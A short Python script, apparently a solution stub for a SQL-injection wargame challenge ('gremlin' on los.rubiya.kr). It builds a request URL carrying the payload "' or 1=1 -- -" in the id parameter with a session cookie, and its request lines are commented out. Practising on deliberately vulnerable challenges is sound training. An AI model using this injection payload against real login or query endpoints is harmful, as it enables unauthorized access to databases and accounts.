#!/usr/bin/python3

import requests
import re
from termcolor import colored
from bs4 import BeautifulSoup as bs
import sys, getopt

url = "https://los.rubiya.kr/chall/gremlin_280c5552de8b681110e9287421b834fd.php"
parameter = 'id'
injection = "' or 1=1 -- -"
cookie = dict(PHPSESSID='lqjdocrtrts7s5gl84ruvmc5aa')

sqli = "' or 1=1 -- -"

query_url = "%s?%s=%s" % (url,parameter,injection)

print(query_url)

# http_request=requests.get(query_url,cookies=cookie)

# response_text = bs(http_request.text,"html.parser").prettify()

# print(response_text)